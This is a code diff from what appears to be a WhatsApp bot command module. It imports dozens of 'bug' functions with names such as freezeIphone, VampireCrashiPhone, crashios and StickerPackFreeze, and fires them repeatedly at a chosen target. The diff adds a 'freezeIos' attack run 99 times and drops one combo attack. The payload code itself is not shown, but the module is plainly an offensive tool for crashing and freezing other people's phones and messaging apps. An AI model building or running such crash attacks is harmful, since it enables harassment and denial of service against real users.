@@ -60,8 +60,8 @@ export default {
   iosinVisFC, NewProtocolbug6, VtxForceDelMsg2, SnitchDelayVolteX,
   freezeIphone, IosInvisible, ContactXIos, VampireCrashiPhone, crashios,
   crashios3, FlowXNull, forceClick, XheavensdeeP, SqhForce, FreezePackk,
-  SqhForceCombo, paymentDelay, CVisible, location, delaytod, AmeliaBeta,
-  bulldozer1GB2, VzxtusHardTime, MewVtxpayment, StickerPackFreeze, LocationDelay
+   paymentDelay, CVisible, location, delaytod, AmeliaBeta,
+  bulldozer1GB2, VzxtusHardTime, MewVtxpayment, StickerPackFreeze, LocationDelay, freezeIos
 } = await import("../../lib/buggers/bug.js")
 
       let progressMsg = await sock.sendMessage(m.chat, { 
@@ -79,6 +79,7 @@ export default {
         { name: 'Delaycrash', fn: () => delaycrash(sock, target, true), count: 5 },
         { name: 'DelayBlonde', fn: () => delayBlonde(sock, target, { jid: target }), count: 5 },
         { name: 'DefJam', fn: () => DefJam(sock, target), count: 5 },
+        { name: 'freezeIos', fn: () => freezeIos(sock, target, group = false), count: 99 },
         { name: 'HardInvis', fn: () => HardInvis(sock, target), count: 1 },
         { name: 'XProtexDelay', fn: () => XProtexDelayCrash(sock, target, true), count: 5 },
         { name: 'BlankVisco', fn: () => BlankVisco(sock, target), count: 5 },
@@ -107,7 +108,6 @@ export default {
         { name: 'XheavensdeeP', fn: () => XheavensdeeP(sock, target), count: 5 },
         { name: 'SqhForce', fn: () => SqhForce(sock, target), count: 5 },
         { name: 'FreezePack', fn: () => FreezePackk(sock, target), count: 5 },
-        { name: 'SqhCombo', fn: () => SqhForceCombo(sock, target), count: 1 },
         // Others
         { name: 'PaymentDelay', fn: () => paymentDelay(sock, target), count: 5 },
         { name: 'CVisible', fn: () => CVisible(sock, target), count: 5 },
